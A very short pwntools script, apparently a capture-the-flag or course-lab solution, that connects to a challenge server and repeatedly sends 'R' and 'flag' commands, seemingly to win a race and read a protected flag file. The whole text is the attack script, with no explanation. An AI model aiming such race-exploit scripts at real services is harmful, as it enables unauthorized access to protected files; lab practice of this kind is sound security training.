from pwn import *
r = remote('up.zoolab.org', 10931)

for i in range(30):
    r.sendline("R")
    r.sendline("flag")

r.interactive()
r.close()